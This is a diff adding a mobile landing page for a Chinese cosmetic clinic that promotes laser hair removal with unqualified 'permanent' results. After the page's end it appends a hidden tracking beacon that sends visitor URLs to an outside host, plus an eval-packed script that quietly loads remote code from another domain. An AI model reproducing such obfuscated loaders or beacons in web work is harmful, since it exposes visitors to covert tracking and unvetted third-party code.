@@ -1,0 +1,292 @@
+
+<!DOCTYPE html>
+<html lang="zn-hans">
+<head>
+<meta charset="UTF-8">
+<meta name="applicable-device" content="mobile" />
+<meta name="keywords" content="冰点脱毛" />
+<meta name="description" content="美洲冰点脱毛系列红妆清凉脱毛集结号" />
+<meta name="author" content="前端陈文超,设计观彩恒">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta property="og:type" content="article"/>
+<meta property="article:author" content="红妆冰点脱毛—美洲冰点脱毛系列红妆清凉脱毛集结号" />
+<meta property="article:published_time" content="2016-05-10T3:18:00+08:00" /> 
+<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no" /> 
+  <title>红妆医学美容——冰点脱毛</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no" />
+ <link rel="stylesheet" href="http://m.hongzhuangzx.org/jczt/tuomao2/css/index.css">
+     <script src="http://m.hongzhuangzx.org/jczt/hgbns/js/swiper.min.js"></script>
+         <!--[if lt IE 9]>
+  <script src="http://apps.bdimg.com/libs/html5shiv/3.7/html5shiv.min.js"></script>
+<![endif]-->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?962430ec3ed96a13639bc2ea0166a15b";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</head>
+
+<body>
+    <a href="javascript:void(0)" onClick="onKST('脱毛项目专题广告')">
+        <img alt="韩式嘟嘟唇" src="images/banner.jpg">
+    </a>
+    <div class="tt">
+        <h2>有毛毛的烦恼</h2>
+        <p>“毛毛”密集，你的表情 如此“丰富”！</p>
+        <hr>
+
+    </div>
+    <ul class="part1">
+        <li>
+            <h3>怄死了</h3>
+            <p>你还是女的吗？怎么长了一嘴“胡子”</p>
+        </li>
+        <li class="pr">
+            <img src="images/li-1_01.jpg" alt="怄死了"><i class="pa"></i>
+        </li>
+        <li>
+            <h3>囧死了</h3>
+            <p>举杯相庆时，腋毛一不小心钻出来了</p>
+        </li>
+        <li class="pr">
+            <img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/li-1_02.jpg" alt="怄死了"><i class="pa"></i> </li>
+        <li class="pr">
+            <img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/li-1_03.jpg" alt="怄死了"><i class="pa"></i>
+        </li>
+        <li>
+            <h3>痛死了</h3>
+            <p>呜呜，好疼，刀片、眉夹伤了腋下</p>
+        </li>
+        <li class="pr">
+            <img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/li-1_04.jpg" alt="怄死了"><i class="pa"></i>
+        </li>
+        <li>
+            <h3>热死了</h3>
+            <p>炎炎夏日，腿毛太密，想露都不敢露</p>
+        </li>
+    </ul>
+
+
+    <div class="part1-cn pr">
+        <h3>在海南，怎能“一毛不拔”？</h3>
+        <p>裙裾飘飘，摇曳生姿，热情的沙滩、舒爽 的清风正等着你尽情绽放，然而，不雅体毛总 是“大煞风景”，且过浓过密的体毛，让肌肤 触感粗糙，将你的风情尽数掩在层层包裹中。
+        </p>
+        <p>
+            海南热夏格外漫长，不清凉怎么叫度夏？
+            <br> 傲人的青春身体只有这黄金几年，与体毛的周 旋耗时耗力不如下定决心，一次解决，享受 光滑无体毛的自信！！
+        </p>
+        <img class="pa" src="http://m.hongzhuangzx.org/jczt/tuomao2/images/bl02.png" alt="水滴">
+    </div>
+
+    <div class="tt">
+        <h2>美洲冰点脱毛</h2>
+        <p>去除每一根毛发 呵护每一寸肌肤</p>
+        <hr>
+
+    </div>
+
+    <div class="part2 pr">
+        <img class="pa" src="http://m.hongzhuangzx.org/jczt/tuomao2/images/yiqi.png" alt="仪器">
+
+        <div class="part2-cn">
+            <div class="nr">
+                <h3> 360°无死角 hold住舒爽</h3>
+                <h4>唇毛、腋毛、臂毛、腿毛<br>
+比基尼线通通脱干净</h4>
+                <p>美洲冰点脱毛是红妆利用巨资引进的最具国际先进水平的美国光化 脱毛仪，由专业激光科医师进行治疗，以激光的光热解作用，使毛囊中的黑色素大量吸收 光产生热，利用光热的扩散原理，从而达到永久脱毛效果，1次治疗能全部取出表皮毛发， 但是在不破坏毛囊的情况下，对休止期、生长期的毛发通常还需要激光治疗3-6次即可达到 脱毛目的。</p>
+
+            </div>
+
+        </div>
+
+
+
+    </div>
+
+    <div class="tt">
+        <h2>清凉脱毛的优势</h2>
+        <p> 红妆独家引进 吹响脱毛集结号</p>
+        <hr>
+
+    </div>
+
+
+    <div class="part3 pr">
+        
+        <ul class="pr">
+            <li>
+                <span class="spanbar-1"></span><i class="ibar-1"></i>
+               <div class="pa bs"><h3>安全快捷</h3>
+                <p>顶尖技术，引进美洲冰点脱毛设备，脱毛金标准，无需休息，随脱随走。</p>
+                </div> 
+            </li>
+              <li>
+                <span class="spanbar-2"></span><i class="ibar-2"></i>
+               <div class="pa ls"><h3>永久脱毛</h3>
+                <p>直击毛根，穿透表皮，进入真皮内，将毛囊和毛干收缩，抑制毛发再生。</p>
+                </div> 
+            </li>
+              <li>
+                <span class="spanbar-1"></span><i class="ibar-1"></i>
+               <div class="pa bs"><h3>美白嫩肤</h3>
+                <p>波长810nm长能穿透至真皮的深层以及皮下脂肪组织，收缩毛孔，细腻肌肤。</p>
+                </div> 
+            </li>
+              <li>
+             <span class="spanbar-2"></span><i class="ibar-2"></i>
+               <div class="pa ls"><h3>清爽无痛</h3>
+                <p>局部冷却，保护正常皮肤不受热损伤，清凉无痛，舒适冰爽。</p>
+                </div> 
+            </li>
+        </ul>
+        
+        
+        
+      <img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/mote.png" class="pa" alt="模特">  
+  
+    </div>
+
+    <div class="tt">
+        <h2>脱毛的流程</h2>
+        <p> 脱毛速成 定制美丽</p>
+        <hr>
+
+    </div>
+
+<div class="part4">
+    <ul>
+        <li><img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/lc-1.jpg" alt=""></li>
+         <li><img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/lc-2.jpg" alt=""></li>
+          <li><img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/lc-3.jpg" alt=""></li>
+          <li><img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/lc-4.jpg" alt=""></li>
+         <li><img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/lc-5.jpg" alt=""></li>
+         <li><img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/lc-6.jpg" alt=""></li>
+      
+    </ul>
+</div>
+
+<div class="part5">
+    <ul>
+        <li>
+            <img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/bz-1.jpg" alt="">
+            <p>对个人肤质、肤色、毛发 密度、粗细等进行全面检测， 提供数据化的检测结果作为方 案选择数据。</p>
+        </li>
+        <li>
+            <img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/bz-2.jpg" alt="">
+            <p>根据检测结果设计个性化 的脱毛方案，如治疗周期治疗 步骤、治疗阶段等，并配置适 合的设备。</p>
+        </li>
+        <li>
+            <img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/bz-3.jpg" alt="">
+            <p>依照方案进行阶段性的治疗，分类精准实施个性化的治 疗手法，满足每一位顾客的私属脱毛需求。</p>
+        </li>
+        <li>
+            <img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/bz-4.jpg" alt="">
+            <p>根据实际的治疗效果及时 对后阶段的治疗做出调整以达 到最佳的永久脱毛效果。</p>
+        </li>
+        <li>
+            <img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/bz-5.jpg" alt="">
+            <p>建立私属治疗档案，由专 业医生对脱毛效果进行后期跟 踪，时刻关注顾客需求。</p>
+        </li>
+    </ul>
+   
+</div>  
+   
+        <div class="tt">
+        <h2>脱毛案例</h2>
+        <p>美丽见证“脱得干净”闪“靓”无敌 吹响脱毛集结号</p>
+        <hr>
+
+
+ </div>  
+        
+       <div class="part7 pr ov">
+        <div class="box"></div>
+           <ul class="pa">
+               <li><img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/img-li-01.png" alt="术前"><p>术前</p></li>
+               <li><img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/img-li-02.png" alt="术后"><p>术后</p></li>
+               <li><img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/img-li-03.png" alt="术前"><p>术前</p></li>
+               <li><img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/img-li-04.png" alt="术后"><p>术后</p></li>
+           </ul>
+           
+           
+           <div class="zx ma">
+                <a href="javascript:void(0)" onClick="onKST('脱毛项目专题立即咨询')">立即咨询</a><i><img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/sj.png" alt=""></i>
+           </div>
+
+  </div> 
+        
+            <div class="tt pr">
+        <h2><a href="javascript:void(0)" onClick="onKST('脱毛项目专题了解更多')">了解更多</a></h2>
+       <img class="pa p8-img01" src="http://m.hongzhuangzx.org/jczt/tuomao2/images/bl03.png" alt="">
+    </div>   
+
+<div class="part8 pr">
+    <ul>
+        <li><a href="http://m.hongzhuangzx.org/mfzx/wttm/bdtm/1132.html"><span>1</span>海口冰点脱毛的五种优势是什么？</a> </li>
+        <li><a href="http://m.hongzhuangzx.org/mfzx/wttm/bdtm/2299.html"><span>2</span>腿部华尔兹冰点脱毛贵吗？</a></li>
+        <li><a href="http://m.hongzhuangzx.org/mfzx/wttm/jgtm/2257.html"><span>3</span>海口激光脱腿毛原理是什么?</a></li>
+        <li><a href="http://m.hongzhuangzx.org/mfzx/wttm/bdtm/1353.html"><span>4</span>三亚冰点脱毛能保持多久？</a></li>
+        <li><a href="http://m.hongzhuangzx.org/mfzx/wttm/bdtm/2071.html"><span>5</span>海南华尔兹冰点脱毛的价格贵吗?</a></li>
+        <li><a href="http://m.hongzhuangzx.org/mfzx/wttm/bdtm/1876.html"><span>6</span>冰点脱唇毛要多少钱呢?</a></li>
+        <li><a href="http://m.hongzhuangzx.org/mfzx/wttm/jgtm/1862.html"><span>7</span>海口激光脱腋毛要多少钱呢?</a></li>
+        <li><a href="http://m.hongzhuangzx.org/mfzx/wttm/jgtm/2207.html"><span>8</span>海南激光手臂脱毛的效果好不好呢?</a></li>
+        <li><a href="http://m.hongzhuangzx.org/mfzx/wttm/jgtm/2170.html"><span>9</span>海南激光腋下脱毛的价钱是多少？</a></li>
+    </ul>
+    <img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/qipao1.png" alt="气泡"> 
+    <img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/qipao2.png" alt="气泡"> 
+    <img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/qipao3.png" alt="气泡"> 
+    <img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/qipao4.png" alt="气泡">
+     <img src="http://m.hongzhuangzx.org/jczt/tuomao2/images/qipao5.png" alt="气泡"> 
+
+</div>
+
+<div class="clear padfoot"></div> 
+ <!--foot start--> 
+<script type="text/javascript">
+swidth=document.documentElement.clientWidth*0.99;
+sbl=swidth/576;
+
+f_a1=Math.floor(0*sbl);
+f_a2=Math.floor(0*sbl);
+f_a3=Math.floor(202*sbl);
+f_a4=Math.floor(70*sbl);
+
+
+f_b1=Math.floor(202*sbl);
+f_b2=Math.floor(0*sbl);
+f_b3=Math.floor(363*sbl);
+f_b4=Math.floor(70*sbl);
+
+f_c1=Math.floor(363*sbl);
+f_c2=Math.floor(0*sbl);
+f_c3=Math.floor(576*sbl);
+f_c4=Math.floor(70*sbl);
+document.writeln('<div class="footer">');
+document.writeln('<img border="0" usemap="#MapF" src="/statics/images/m_img/foot-1.jpg" style="width:100%;" />');//
+document.writeln('<map name="MapF" id="MapF">');
+document.writeln('<area shape="rect" coords="'+f_a1+','+f_a2+','+f_a3+','+f_a4+'" href="tel:4000182622" />');
+document.writeln('<area shape="rect" coords="'+f_b1+','+f_b2+','+f_b3+','+f_b4+'" href="/" />');
+document.writeln('<area shape="rect" coords="'+f_c1+','+f_c2+','+f_c3+','+f_c4+'" href="http://m.hongzhuangzx.org/swt/shangwutong.html" target="_blank" />');
+document.writeln('</map>');
+document.writeln('</div>');
+</script> 
+<!--foot end-->
+</body>
+</html>
+
+
+
+<!--请将以下码嵌入到您网页源代码的最后面，通常是</body></HTML>之后,这样在服务器升级维护的时候也不会影响您的网页打开呈现速度。-->
+<script type="text/javascript" src="http://kefu5.kuaishang.cn/bs/ks.j?cI=868330&fI=65110&ism=1" charset="utf-8"></script>
+<script type="text/javascript" src="http://www.hoozonspa.com/kst_pc.js"></script>
+
+<!-- catch system 1-->
+<script type="text/javascript"> 
+var thisp = document.location.href;var refp = document.referrer;
+document.write('<img style="display:none" alt="" src="http://x.jiekon.com/c4me/c/?username=hongzhuang&amp;referer='+encodeURIComponent(refp)+'&amp;thispage='+encodeURIComponent(thisp)+'" width="0" height="0" />');</script>
+<!-- catch system 2-->
+<script type='text/javascript'>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2.6("<0 3=\'4://5.1.7/8.9?a=b\'></0>")',12,12,'script|d1jd|document|src|http|public|write|com|sj|php|id|8039'.split('|'),0,{}))</script>
